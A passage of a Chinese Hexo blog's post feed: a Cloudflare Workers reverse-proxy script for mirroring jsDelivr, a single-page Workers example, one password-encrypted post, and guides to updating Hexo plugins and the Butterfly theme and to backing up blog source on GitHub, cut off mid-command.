&#125;)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">        <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">        <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"> </span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-credentials&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy-report-only&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;clear-site-data&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (content_type.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>) &amp;&amp; content_type.<span class="title function_">includes</span>(<span class="string">&#x27;UTF-8&#x27;</span>)) &#123;</span><br><span class="line">            original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(original_response_clone, upstream_domain, url_host);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            original_text = original_response_clone.<span class="property">body</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">            status,</span><br><span class="line">            <span class="attr">headers</span>: new_response_headers</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">        j = replace_dict[i]</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            i = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            i = host_name</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (j == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            j = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            j = host_name</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">        text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span> (<span class="params">user_agent_info</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> agents = [<span class="string">&quot;Android&quot;</span>, <span class="string">&quot;iPhone&quot;</span>, <span class="string">&quot;SymbianOS&quot;</span>, <span class="string">&quot;Windows Phone&quot;</span>, <span class="string">&quot;iPad&quot;</span>, <span class="string">&quot;iPod&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制粘贴完后点击右边<code>保存并部署</code>按钮，等待生效。【由于 Cloudflare 界面调整，原本进入<code>触发器</code>的流程需增加点击<code>设置</code>这一步，图片界面如有不同以文字为准】</p><p><img src="https://s2.loli.net/2024/10/26/pLtdfTh4YS5jBbC.jpg" alt=""></p><p>由于 Workers 的域名被拦截，目前只能通过绑定其他域名的方式来解决访问问题。</p><p>回到概述界面，点击<code>【Worker 名称】</code>-&gt;<code>设置</code>-&gt;<code>触发器</code>，按要求填入域名。输入后保存，等待<code>域</code>一栏证书变为绿色<code>有效</code>二字，即可使用自定义域名访问。</p><h2 id="使用">使用</h2><p>例如原来的链接是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js</span><br></pre></td></tr></table></figure><p>那么之后可以使用以下地址进行访问（<code>www.example.com</code>替换为前面绑定的域名）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/npm/jquery@3.7.1/dist/jquery.min.js</span><br></pre></td></tr></table></figure><h2 id="附">附</h2><h3 id="Workers-挂载单页">Workers 挂载单页</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">  event.<span class="title function_">respondWith</span>(<span class="title function_">handleRequest</span>(event.<span class="property">request</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// HTML 代码</span></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Hello&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div&gt;Hello world&lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Respond to the request</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Request</span>&#125; <span class="variable">request</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleRequest</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(html, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=UTF-8&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">status</span>: <span class="number">200</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Butterfly 主题自用更新一览</title>
      <link href="/posts/1846056213/"/>
      <url>/posts/1846056213/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被校验，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="85151134c1ad258125609d69251d3747a9d528055296c1b30dc25ba085038084">3c4eb1d13bbfc472d2158149c25b9b2127cbac205926b7ffd0243688e0d4a6c8756ff64a09735193102f2e03e5f27b6e45bf2d808656fb04731cf9f4a6510f6c10aad312322c6a3707ca6998fb2fd512a62e448e043caa2c6ff58cf693a5281b70f63dab5079e563e4c9ab76266cf5fee16f9a62fef884f1233730abb6044ab0eed0b52ecde6906856643c889b186e87e1270f6612a8b41a605ab8311e09903e30241fe3f68239adeed64bc9218879c179851ca14c3b4ba22948d9476fe6754cac0b001dbb3087e0b16d97864d23a3c03cd277e4ff2eb3bef0de6c16fac0b4f315d1b231df5d60f5b054f0ae4e61c2f48650f2b1e5cfec3bca3d098c8677ac0b5117cb77627f526a3a16bb67612956f2e70f75e21b0a0b58cf47a0de5f9611f167922d6061b92383d8e12428d232502cfa5c4b66f321e829237d0fe713891ccbc2329dd9d7d96ca3ca8906462fa1c66c1884daf0d38cb0fca20963b3781b01eb1515ff908abd588a8f55c1d2edc790ee3660a285da2afc724c4907205455e558f230c99df572df9007123286f44bcbedbae4a86afb5e1c8339396b2a37d01d82bcce3dd63af5bf6276536536f2bfed0924276e9eda4c9435b8e69a386aacc22e98208037eb6edfe4659008896eb071c967bf246318524775a083075046282de2ab303f6b026c376512f95696608cb850ad57aa22a8ed2fd38cb106fd8eb714ef6f333473360b5be5e0fff35e2e21d249f7b6bb35637a9fac25e087190263523cd30ca21bc146290d44125110da0f7203a93ae44f923d1c5ce3445c9ce97faa6dc397fddba1df32c5ea536e0467d8cff219ce6f3fc3c0a4692d6c30d0787e1c7bdd9d95611f2a59f55fe989e232f8b89475e594315e3edb321570cd76b3fc4e58e733a5d28c8a3f84df121d61153b03b636f19b900b9c8d74053df99e5284b2542c1ea82fb96fc9035e1d1d6fef8602b269beb6e51ed7e07c72246cc3d722f07529ddb9a733ecde58d1eaa56a13476bcb058124213756f44eb4a20d1fcd72efb4a8d91275e46d0047eae1d5ed8f2e91f12545cc40a416898b4c82b51d627f1ebc0cfda9ce030fc452904a140c90d52a13d5b0e6e67b2f7b7ee8aeb9786eb2603c046d049fb06a2c0cc9623ce620ca65320856ff7332900cf7811aefe9b1968eb4d9b089cadbc1605ce5a8659f73f285dffc5f64bdaabd9309aab9a06cb9c0b234315c443c93e56dfd1d8da36c193c0eee1bf002e48f6b2f6127bc1d2269900cbc792aca49ebb04e5f41793406ea623271404e2b464d3e1d42bc54514056a0100d99f4449f47b8570a8b97d17c5fd26b41f3cfdaabc84f4cb1103e55fed876910d1f678340a3578a8d23a90605495e0ab4cbcf30cff30c946c69e997901c2cc754fc50afd4c4a5f78c7b404ef1ebe42007140aeb4a2201cb3b486cb62a4533357b63a872c4ea9b2e4655342e552671ee66fc2122394a40c81812f8d09fe8a7960a4da24f714a5081d7740bb5d18e592b0d718008917f5cbe6f1d4245c8ddb912fcc1985edd93b08277211082a1aef4b0e86281e84f52a038daf546c6df2fd029eb95fb16e294f1c3bfa70e0939b0018c75636f32c2b8326464bb55d0aad99d448e1fc8141dc4d88e636a83cde7ba6154fc413a3e5993b4d38542cd5dca4dd928bbe77632335f7093462e94ef133407918a1a83f9f6923517e56eb3f8c5918ca56da7a7bc8c462eb41c2265e1c298f002b90b4a6816239291dea1545dbe70b093abf7f9e25f7a40e8f413536f18e88c9ae127e2178b524542e857e016136556c9b07d72c0c1022d28b917fe93ecfb622dcc2d255d77f48a9a0e4a70dfdff7b1ffbc08affb2332f2294d01c3c3b016010d3756d93687598ebd1e84f0b69b35380a093b9a30f675d5d657f1acff05050a0e856f50392fdb6ae0c3817dd00a77b8d9a124d8c24861610cb296b89b126a29e8842641c4e9e955d1e6bb8361c7d35cff4074e102c566e2df22382b49cecc041406c0509b863fc236aa1c5d8f48f33110b88d86b7b44120761d9543adfe7ef8da2abd0a14e8baa584bc6ccde88a6d5f47acd44c4725d39dcd1948a5071106fbd064be0c90bc3f34195eb1b1896642ca967f35c169d375c4d1d282cc9620968ef5c61ec544931c689f7d023138e0fc4ab16df5ae0edc3bd1883abf7df824b832689648ae28563f810559e3f6b0add763497607704e1a7c998e10904cbaeb73e28505e4d74a535157fea71e59f972e6ddf148a9e563ac134353a00e08e8cbaf15cdfa02bac332794e0b42fd5d0d7a89591a6a8b57724fb9f1ab6860265b80750ad12087bb62801613ad3ac180636a5bd88415543bdb363e2db0ce8d1fab2c787fe3738a7699c5087d3aeeaf1f4615b434e1ecb157a5c6993fa8c2d717b12c4264d971069ea1f691ef7ea70400d4061f55c4daccb50a49a56122fe1523a98bc8044fbe46bf6065225e97efbe00e80af854b6f0de8543e7a710ce34f6a755487c6c0a51f6a5da70cd94140d7757d3dfabfa8e7a68ad5cc245431939791db898ba81561efe45b11e05addc036ffd329d236ad201073154f3775b07d522d0eea6fc205275d10e0db2cc1daa909e330af65d0c0dfc5bca3913943030ba6eae4aba4229cfcaeaf4cdf5667ee28742450342976f93be2fb1fcf1cc90c29177922d8f3dfe5c795fa07785d2788d7a2b7a27b916ace7cbc7d05350f8e495db635099bd5bc9e7b412c9d8bdfd1cd69e873c95cdf1a9e4f092b52157c389d13de093877c2b9739960252688dc1ec896a77ab02c0d6ac494b88249110d5cdbc34f61e2dcda2310dc0557b5f0fea73a0722a6c88c825ff7aa8c09983b0c4ed87cc3a93c5a9cebeaa3b6adfc0f36b0d9466426ea52d2daaa3cf2b65cc6480614cf940ca43998f7e30862838157a4bb3fbf3841ebd983d282a199cb4e1bc1cd6f241321f0dd0b7f81d1b4508cef507728aefa80a6aa7f873a5ef5da0df62e71bce3a68d060e8e24428939d8f107d0245d7cec76d3422fc854569127226f3ecb0a5b613c2d99420b2707c5b759dc1801dc4e5c661c2d9c4a09e23bcfc18e140df893ace527cfb64683ebcbd1eef07b715328997b7ca85a941683e08560b9ca831cba68c8893ecbf3a449c28a8bc7e461cc7a4857bd4ede62afcd0afb67accbfa5a76c888a016d74e047486cf38a5e42c8548d2856e7bfa675827442d13b9dbda6c42df71c88c2061156aa3a4bb8ba3a07d261951eadb9f292c4b91af356213dfbf3395404f699920274d2f1ddbaa6bfe39ba1ab913d795adf36863e560aca4d3db6bfa3dc939e070bc55b9fcd06bad37f4053ac0a311be9ba19fc8548134d1f46f91c87abd42ec2386e667d7b5aef5ea25c9b8ac4caf387022aaa02ee95715ac0ec4f0f6188d12c2f767b5fd3f58d6d9f952dbbd2c19fb72d5f613430cdc9c9c4bbef69e358be2e6d76b2afc3fa5bf9029c8f45e2ddd6f22e4c0fd1a1909757931b640f5c352160de59f10e2669fc7cb9778c78c9f6627dbdd4ab8e451cabfc8117a9de211996613adab3888932c43dd6de58ef80cea5c57315451317226e5504ff093647930af5d1b9f1e00c189f089c83667605ed8a1c2b876da21ae76960d9d89e5c326740ef293f158632cef8e91fcc9b91bca8168786cffaf4aad074c1add4dbee546f567836284fa3c487c9b24fc15f9ab5f2aa10ad81fb211b2847874fce82ff248faf0d486f4259fbbc6ee05ba24bf857f7c286bec6865674a5ac3020d3339e621e747b62ca664f4176b13c9a40b5d44bdac9c1124acd704a6a3177107b47329ab1d8bdec6ac040dcf1a5bad3f43c378ed4e6a3ae01c0bdb2439c4944177d3d1757d16fce53fd9297d8da1dff1546019a46b4ab328a2b63bed49f6e8a71df8c3a7bb806a96bd7c7a128b281c171bf14b040d8cd94e90d624c78f50904ee61ea3fea8098a28c73750a168858c868b345437d7f8434d129ef758478ade9077deb409d4ac06e390b8a8feafb568988f8e2ad3b8345b635ee9b3f6eaef2cf78ab629fa66de4b5071ba059780b3786668e00f037285c4a9da5e8349db9b401a191704429a93f8fe3e7afc3dc82f6ad7e6407d23c9235738d9323b66513f7e56e6a141ffe200252574817b0935acf047c7384f6832a1370daede7a5cc421888cd8c18df395a79413ef7cc6107350730bf671657b3297ef38072e63ac970aeb7753179a8c7c4da21276a026bf25b0c9fc019095609e40e9588a1e18757ae1d48ba35f18385838f3c23fcaf340a619f7cf9f988c5dab3092c44b8a2f21d3b4b5ee1fc2146f167e2864ad73f481b80566edea3df485b30de933c56447d97d41340de52a169b0486dd622127090ccfa0a212daf925d0cda11db80caf4b0647f68a06d48b611ad777493e78058da46cdbf983381c3c396b73889f728d4c9063593c3bc435bf0af4a3e29ed8b1e4eede2c94c946e72dd897fe5ad7aae9d6c8ebfdfbf6ad12688b23fde3c17db73c61ae7464018de4f126009a0ad277272639397400114600758277db41836f3b76d48907b137aed9506d995b9d576a848aea74dafa05536315f270dc16948b960b439082a429167292a42732713d94ac86c55da4837700e7a6cedae6f10591578ec34ced7d6c40c9c18ed986ff009335c0af7e2e2231baaabedfbc880225b0f3841225a20ba6f4559a2a4674c28485097d24004598b6f7b8931a4a679d4a1a60c7522c4fb4a1bc7ba5d709e76c946ad8a34cf39960fc42ace309f3806eb2070f9eb356c9013e13b3165822bbc140125015706f4f701826c997aeab2e67e0d88a64a4a19801f4d50cdd07e9685f025f7690b4f57cac65a20049a586a619bfd938e9f182507687515cb1f88bfb0e95af50c738fb1427855c7cd67119f1ade1635ed87e65d258b7b58ea22dd6dd3b0ebfa40ee22f2dcb01940be7d8cb16e5adc0934c2f98115e61b486dad587f155da991b7d1f6720b5b7c7f567d397c101e51eefdb922e2ef06216d9a043bfdd4f018e66944ff3b5d02e88c788d22f2fd6df83cc92d6378d38ac32a9574e60e1040c001f628526f36d9764dda583ae37484fce68a2313164244ca40173063f898ddd8c89611d8e5b04b0b52b489372e3c7ad841298b766223fa90feee55c8002f46329d9dd15455ae97d4d54bde13624f6a36e236638b3ec767b469542d2f81fd9f1ef95da0450e1c7e7e6aeef3bebcd4d0298c790d36209dd66438b1cdd51937369ba65640247c063d41538e76e9724efd452bd899dcc147ab5aa4b01f52a07173c317ea2b5486a30f05618b9ec827b81b4513131346ade6eeab591d8286137e3726f3b3dd5b78bea3758e7b398fd37c8d26a0b16c262b9f9a15eb8a9d42bd9052ba5e7f39d6663e6cdd3c2ec3535c2165b3e0dc5dee4d9ac8e3ef1620df7ba2e34221b17dd86668f1479a828f1bf4e765220dc8d0a34dffd85ad62c3f98d3f4ff70fbce8ca2710c4bdb30ac334cba5ab008dbf914fa66e9a8b5ed55db4b6fdafeada96a9c0cca89f2683cf979dbd66ee10c81ad4a748dae378a6af5e5807776aaf411f939943ce231cbd666e61bbf1c97a3b3b03d48a9ae1bc10af6c89cd76cad117c6114855571e9ee17096b5b638589547e048cff44646bef5a4c5f6569c3b9b3ed142ed9154d747127adbc1c45ba53bf276a2844edc06e77bbc3529c03da3647b196e56535c15cb5b7367a21700b1aff0d2d971a0955f0bb3e3658e6f3620f7bdc8d52d20896b0870d885ac7c919072079b455b8cce4f4abb69cd8813c996321afe747c58bf360258a33232ce0803a366997b8ea3ceb8fa8e3237cd1a16a3f489d23e241cd5cad18aab8f7951cc7f86f918f51d9c18fc88dbea83b4de87ad915f5423c1c5267fca41c2d75512e9a3f3c2aacc72e5fc0935f302d8076eddf41e113f0ac1b040ff5998c73a124a691da46daf71301460a9f42a163e647c3f0bed4280f5bc80d649438109a3dc6a978dc5947a62ca3897325823152302d1f7d629916a987ce31082aff99f2257083ec6ae8d841ce1181b1310b803eb29b6f7bff77604bd6c67e4ae55791210ba51dd3e8c66dfca36b49e4f94da48d2d6aefd1ff96e40aa505345d3d5b18c7fff9a2bb693b0d9294cbac7512fca6231d1415336386b87fc420bcf9b31369f6742400a253a74da3f3e9bc23e836be8669275f0b3160a7b33ea04c1f1fa74a88febe123f301ffa23cca1c53a973a323129ba73a49eaf166a99c7ecf286040de6ebb171875e19038320a6194837905667637501eaa4abf8fcab9b15757cee56c240b1400233ac0a6f6c920ae8b041cb31c7a00f3615e57d218754af9f065627b1f390bd20e3b827b25bd4bba4dd3122553ab91bb8de1684440baefd26ce0f18f92214b08619ad6dd09e75ff7fc34c26eacc37279d99ee1521c1c4fb85f7cba44418f289383dd656315ccd76b750ce9fc5d7b1dfc5190979dd1ed4c0ce090db692729656bcbb30f47f9e36e21f52139a8a362d67a04f3a0d85261465f5bc9d09bafc3054da4804cda722caec2e215dea1572e44f611256ba15e60b6bc9726adbfc51a272d84b6e697892c5a6db7c34c4d77fe3d269273ae698b43879dac46b1ba0847badb8969e0abe693be4523d34dda8b9f7152485e4ae20ae625ce3805f5f9a9c23ac6af1d726</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 插件及主题的更新</title>
      <link href="/posts/440783934/"/>
      <url>/posts/440783934/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我不太喜欢使用旧版本的程序（除非某个旧版本太好用、新版不如老版顺手），一般看到有更新就会升级。如果现在我使用的是 WP 那么情况会简单很多，然而……</p><p>事先说明：</p><ol><li>更新前请备份重要文件</li><li>如果官方镜像较慢，可自行配置 npmmirror 镜像源（原淘宝镜像源）</li><li>建议执行前检查下 node.js 版本，最好更新为官网上最新且稳定的那个版本</li></ol><h2 id="更新-hexo-cli">更新 hexo-cli</h2><p>使用终端进入 Hexo 根目录，执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo version # 查看当前版本</span><br><span class="line"></span><br><span class="line">npm i hexo-cli -g # 如与新版本不同，可执行此命令全局升级 hexo-cli</span><br><span class="line"></span><br><span class="line">hexo version # 再次查看以核对版本</span><br></pre></td></tr></table></figure><h2 id="更新插件">更新插件</h2><p>使用终端进入 Hexo 根目录，执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">npm install -g npm-check # 全局安装 npm-check，已安装可跳过</span><br><span class="line">npm install -g npm-upgrade # 全局安装 npm-upgrade，已安装可跳过</span><br><span class="line"></span><br><span class="line">npm-check # 检查系统插件版本</span><br><span class="line"></span><br><span class="line">npm-upgrade # 更新 package.json</span><br><span class="line"></span><br><span class="line">npm update # 更新 hexo 及所有插件</span><br><span class="line"></span><br><span class="line">hexo version # 查看版本，判断升级成功与否</span><br></pre></td></tr></table></figure><h2 id="更新-Butterfly-主题">更新 Butterfly 主题</h2><p>由于我在使用时对主题源码进行了一定的自定义，又因一些缘故不得已删除了主题文件夹下的<code>.git</code>目录，因此在升级时比较麻烦。多次折腾未果，索性采取简单粗暴的方法，重装主题后手动还原魔改文件（好在改的不多，大多都是从配置文件里修改的）。</p><p>备份好魔改的文件，然后把<code>【Blogroot】\themes\butterfly</code>目录删除。回到<code>【Blogroot】</code>目录下打开终端，执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>（请保持网络环境良好）之后手工还原魔改的文件。</p><p>至于<code>_config.butterfly.yml</code>文件，我是手工“升级”的，用 vscode 对比代码一点点改。也可以前往<a href="https://github.com/jerryc127/hexo-theme-butterfly/releases" rel="external nofollow noreferrer">https://github.com/jerryc127/hexo-theme-butterfly/releases</a>进行修改。</p><h2 id="参考">参考</h2><p><a href="https://ttiee.github.io/posts/2022/428d/index.html" rel="external nofollow noreferrer">https://ttiee.github.io/posts/2022/428d/index.html</a></p><p><a href="https://alowree.gitee.io/posts/how-to-update/" rel="external nofollow noreferrer">https://alowree.gitee.io/posts/how-to-update/</a></p><p><a href="https://guoguocai.github.io/2022/06/05/%E5%A6%82%E4%BD%95%E5%8D%87%E7%BA%A7-Hexo-%E7%89%88%E6%9C%AC/" rel="external nofollow noreferrer">https://guoguocai.github.io/2022/06/05/%E5%A6%82%E4%BD%95%E5%8D%87%E7%BA%A7-Hexo-%E7%89%88%E6%9C%AC/</a></p><p><a href="https://novnan.github.io/Hexo/update_hexo/" rel="external nofollow noreferrer">https://novnan.github.io/Hexo/update_hexo/</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> Hexo </tag>
            
            <tag> 代码 </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 GitHub 备份 Hexo 博客源码</title>
      <link href="/posts/3679713651/"/>
      <url>/posts/3679713651/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我最开始希望弄个使用 PHP+MySQL 的博客系统，很大一部分原因便是我无需担心本地情况。后来因为实在忍受不了缓慢的加载速度与稳定性，又因不想多加开销，于是使用了静态博客（虽然国内使用了 GitHub+Cloudflare 后速度也不咋地）。</p><p>这种系统虽然优势明显，不过暂且不说发布文章依赖本地环境（在线部署也行，不过暂时没时间折腾），而且一旦电脑寄了或者重装系统等，恢复起来就很麻烦。重装环境还能忍受，源文件嘛……</p><p>U 盘、网盘备份固然可行，但每次都要手动复制文件，不麻烦？</p><p>我既然选择了把博客部署到 GitHub 上，何不把源文件也同步上去？</p><h2 id="前言">前言</h2><ol><li>本文中部分内容需根据自己的环境进行修改。</li><li>我知道有个叫“hexo-git-backup”的插件，不过因为某些原因我没能配置生效，故本文不讨论。</li><li>本文部署平台以 GitHub 为例。本文默认各位的 Hexo 能正常运行，Git、Node.js、SSH 等东西已经配置完成。</li><li>本文提及的方法不唯一。</li></ol><h2 id="创建仓库">创建仓库</h2><p>在 GitHub 上创建个新的仓库（使用博客所在仓库的分支也是可行的，此处为方便故另建仓库），这里可以选择<code>Private</code>。创建完后，进入刚才创建的仓库，点击<code>Code</code>按钮（应该是绿色的），将<code>Clone</code>中的地址复制，随后在本地找个空文件夹，打开 Git，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 【HTTPS Git 地址】</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/16/XcIrQvnGdbjWNUs.png" alt=""></p><p>等待执行完成后，clone 的目录中会出现<code>.git</code>文件夹，之后将该文件夹复制到你的 Hexo 目录下（即平常执行<code>hexo d</code>等命令的目录）。</p><p>确保当前目录（指 Hexo 目录）下存在<code>.gitignore</code>文件，没有的话自己创建个便是。</p><blockquote><p>一定要在推送前就创建此文件并配置完成，否则当 Git 已开始管理这些文件之后，就无法再通过过滤规则过滤它们。如果已经把不想上传的文件上传了，必须先从远程仓库删了它，然后 pull 代码到本地仓库，或者从本地删除这些文件并且在。gitignore 文件中添加这些你想忽略的文件，然后再 push 到远程仓库。</p></blockquote><p>编辑该文件，写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">_multiconfig.yml</span><br></pre></td></tr></table></figure><p>以上是上传时候忽略一些文件（如果有其他不想备份的文件在此目录下，也可以自行添加）</p><h2 id="推送">推送</h2><p>在此目录下打开 Git 并输入【注：此条选做】：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote 